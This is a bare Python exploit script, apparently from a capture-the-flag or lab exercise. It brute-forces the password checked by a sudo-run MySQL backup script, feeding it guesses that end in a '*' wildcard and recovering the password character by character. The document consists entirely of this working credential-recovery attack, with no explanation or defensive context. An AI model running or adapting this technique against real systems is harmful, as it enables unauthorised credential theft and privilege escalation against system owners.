import string
import subprocess

charset = string.ascii_letters + string.digits
passwd = ""
found = False

while not found:
    for char in charset:
        process = subprocess.Popen(["sudo", "/opt/scripts/mysql-backup.sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        pwd = (passwd + char + "*").encode()
        process.stdin.write(pwd)
        stdout, stderr = process.communicate()
        process.stdin.close()

        if process.returncode == 0:
            passwd += char
            print("[+] Password: ", pwd.decode())
            break
    else:
        found = True
